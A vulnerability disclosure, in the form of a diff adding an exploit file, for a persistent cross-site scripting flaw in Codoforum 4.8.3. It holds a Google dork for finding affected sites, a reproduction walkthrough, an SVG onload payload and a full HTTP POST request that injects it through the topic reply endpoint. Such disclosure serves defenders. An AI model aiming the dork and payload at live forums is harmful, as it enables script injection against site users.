@@ -1,0 +1,37 @@
+# Exploit Title: Codoforum 4.8.3 - Persistent Cross-Site Scripting
+# Google Dork: intext:"Powered by Codoforum"
+# Date: 2020-01-07
+# Exploit Author: Vyshnav Vizz
+# Vendor Homepage: https://codoforum.com/index.php
+# Software Link: https://codoforum.com/buy
+# Version: Codoforum 4.8.3 
+# Tested on: Linux
+# CVE : N/A
+
+Codoforum is prone to a Persistent Cross-site Scripting Vulnerability in User-Comment replay section
+An attacker can exploit this issue to creating user with payload and perform cross-site scripting attacks.
+
+Codoforum version 4.8.3 is vulnerable. 
+
+1. Install Codoforum 4.8.3 in a local server.
+2. Go to Start a new Topic >> Replay to any of the comment with XSS Payload
+3. Payload : "><svg/onload=alert(1)>
+4. Now  an XSS alert will be triggered here.
+
+POC:
+
+POST /forum/index.php?u=/Ajax/topic/reply HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 214
+Origin: http://susmost.com
+Connection: close
+Referer: http://localhost/forum/index.php?u=/topic/21/avg-antivirus-download-avg-antivirus-free-download-topbrandscompare
+Cookie: PHPSESSID=b5dccfcef3b5f4ce9571fbd3269d5b23; cf=0
+
+input_txt="><svg/onload=alert(1)>&output_txt=STARTCODOTAGp%3E%22%26gt%3B%26lt%3Bsvg%2Fonload%3Dalert(1)%26gt%3BSTARTCODOTAG%2Fp%3E%0A&tid=21&end_of_line=&token=35f5f85a86b15f475bbd9b79de313fa0&pid=false
